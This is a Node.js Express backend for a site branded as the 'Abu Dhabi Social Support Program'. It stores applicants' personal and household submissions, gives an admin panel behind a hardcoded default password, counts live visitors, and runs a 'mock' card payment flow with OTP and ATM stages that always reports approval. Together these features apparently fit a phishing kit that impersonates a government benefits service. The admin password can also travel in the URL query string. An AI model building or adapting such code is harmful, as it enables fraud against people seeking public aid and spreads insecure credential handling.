// Abu Dhabi Social Support Program - backend server
// Serves the static frontend and provides a small JSON-file-backed API
// for storing application submissions and tracking active visits.

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

const DATA_DIR = path.join(__dirname, 'data');
const APPLICATIONS_FILE = path.join(DATA_DIR, 'applications.json');

// ---- Make sure the data folder/file exist ----
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(APPLICATIONS_FILE)) {
  fs.writeFileSync(APPLICATIONS_FILE, '[]', 'utf8');
}

function readApplications() {
  try {
    const raw = fs.readFileSync(APPLICATIONS_FILE, 'utf8');
    return JSON.parse(raw);
  } catch (err) {
    return [];
  }
}

function writeApplications(list) {
  fs.writeFileSync(APPLICATIONS_FILE, JSON.stringify(list, null, 2), 'utf8');
}

// ---- In-memory "active visits" tracker ----
// Each browser tab pings /api/heartbeat every ~15s with a random visitorId.
// A visitor counts as "active" if we heard from them in the last 30s.
const lastSeen = new Map();
const ACTIVE_WINDOW_MS = 30 * 1000;
const paymentFlow = new Map();

function countActiveVisitors() {
  const now = Date.now();
  let count = 0;
  for (const [id, ts] of lastSeen.entries()) {
    if (now - ts <= ACTIVE_WINDOW_MS) {
      count++;
    } else {
      lastSeen.delete(id);
    }
  }
  return count;
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ---- Admin auth middleware (simple shared-password gate) ----
function requireAdmin(req, res, next) {
  const supplied = req.get('x-admin-password') || req.query.password || '';
  if (supplied !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

// ---- API: submit a new application ----
app.post('/api/applications', (req, res) => {
  const { applicant, persons } = req.body || {};

  if (!applicant || typeof applicant !== 'object') {
    return res.status(400).json({ error: 'invalid_payload' });
  }

  const record = {
    id: crypto.randomUUID(),
    applicant,
    persons: Array.isArray(persons) ? persons : [],
    submittedAt: new Date().toISOString()
  };

  const list = readApplications();
  list.push(record);
  writeApplications(list);

  res.status(201).json({ id: record.id, submittedAt: record.submittedAt });
});

// ---- API: list applications (admin only) ----
app.get('/api/applications', requireAdmin, (req, res) => {
  const list = readApplications();
  list.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
  res.json(list);
});

// ---- API: verify the admin password ----
app.post('/api/admin/verify', (req, res) => {
  const { password } = req.body || {};
  res.json({ ok: password === ADMIN_PASSWORD });
});

// ---- API: heartbeat for the "active visits" counter ----
app.post('/api/heartbeat', (req, res) => {
  const { visitorId } = req.body || {};
  if (typeof visitorId === 'string' && visitorId.length > 0 && visitorId.length < 100) {
    lastSeen.set(visitorId, Date.now());
  }
  res.json({ ok: true });
});

// ---- API: current active visit count ----
app.get('/api/active-visits', (req, res) => {
  res.json({ count: countActiveVisitors() });
});

// ---- Payment flow mock endpoints used by the frontend ----
app.post('/api/payment', (req, res) => {
  const { requestId, amount, currency, cardName } = req.body || {};
  const id = requestId || crypto.randomUUID();

  paymentFlow.set(id, {
    id,
    status: 'otp',
    redirectUrl: 'otp.html',
    amount: amount || 0,
    currency: currency || 'SAR',
    cardName: cardName || 'Customer',
    createdAt: Date.now()
  });

  res.json({ ok: true, id, status: 'otp', redirectUrl: 'otp.html' });
});

app.get('/api/status/:id', (req, res) => {
  const { id } = req.params;
  const record = paymentFlow.get(id);

  if (!record) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  const payload = {
    ok: true,
    status: record.status,
    redirectUrl: record.redirectUrl || 'otp.html',
    redirect: record.redirect || null,
    stage: record.stage || 'payment',
    decision: record.decision || null
  };

  res.json(payload);
});

app.post('/api/otp', (req, res) => {
  const { id } = req.body || {};
  const record = paymentFlow.get(id);

  if (!record) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  record.status = 'approved';
  record.stage = 'success';
  record.decision = 'approved';
  record.redirect = 'success-ar.html';
  record.redirectUrl = 'otp.html';
  paymentFlow.set(id, record);

  res.json({ ok: true, redirect: 'success-ar.html' });
});

app.post('/api/atm', (req, res) => {
  const { id } = req.body || {};
  const record = paymentFlow.get(id);

  if (!record) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  record.status = 'approved';
  record.stage = 'success';
  record.decision = 'approved';
  record.redirect = 'success-ar.html';
  paymentFlow.set(id, record);

  res.json({ ok: true, redirect: 'success-ar.html' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
